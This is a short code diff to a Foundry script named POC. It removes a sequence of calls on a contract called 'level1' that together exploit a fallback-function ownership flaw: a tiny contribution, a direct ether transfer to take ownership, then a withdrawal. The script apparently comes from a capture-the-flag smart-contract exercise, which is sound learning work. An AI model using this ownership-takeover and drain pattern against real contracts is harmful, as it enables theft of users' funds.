@@ -10,11 +10,6 @@ contract POC is Script {
     function run() external {
         vm.startBroadcast();
 
-        level1.contribute{value: 1 wei}();
-        level1.getContribution();
-        address(level1).call{value: 1 wei}("");
-        level1.owner();
-        level1.withdraw();
         
         vm.stopBroadcast();
     }
